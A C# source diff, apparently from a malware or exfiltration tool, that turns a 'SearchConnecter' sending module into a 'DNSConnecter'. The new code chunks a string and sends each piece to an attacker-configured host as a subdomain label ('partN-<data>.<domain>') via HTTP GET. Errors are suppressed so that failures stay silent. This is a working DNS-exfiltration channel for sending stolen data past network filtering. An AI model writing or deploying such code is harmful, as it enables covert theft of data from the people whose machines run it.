@@ -3,17 +3,17 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
-using CORE;
 using xNet;
+using CORE;
 
 namespace Connecter2.Sending
 {
-    class SearchConnecter:IConnecter
+    class DNSConnecter : IConnecter
     {
-        private static string _n = "searchSend";
+        private static string _n = "DNSSend";
         private string url;
         private int kol;
-        public SearchConnecter()
+        public DNSConnecter()
         {
             url = sys.setting.Get(_n, "iurl");
             kol = int.Parse(sys.setting.Get(_n, "isymbol"));
@@ -28,18 +28,26 @@ namespace Connecter2.Sending
             int i = 0;
             while (i < str.Length)
             {
-                string tmp = "part"+i.ToString()+"-";
+                string tmp = "part" + i.ToString() + "-";
                 if ((i + kol) > str.Length)
                 {
                     tmp += str.Substring(i);
                 }
                 else
                 {
-                    tmp +=str.Substring(i, this.kol);
+                    tmp += str.Substring(i, this.kol);
                 }
-                Http.Get(url+tmp);
+                try
+                {
+                    Http.Get(tmp + "." + url);
+                }
+                catch (Exception e)
+                {
+
+                }
+                
                 i += kol;
-                sys.writeln(url+tmp);
+                sys.writeln(tmp+"."+url);
             }
         }
         public static void SetSetting()
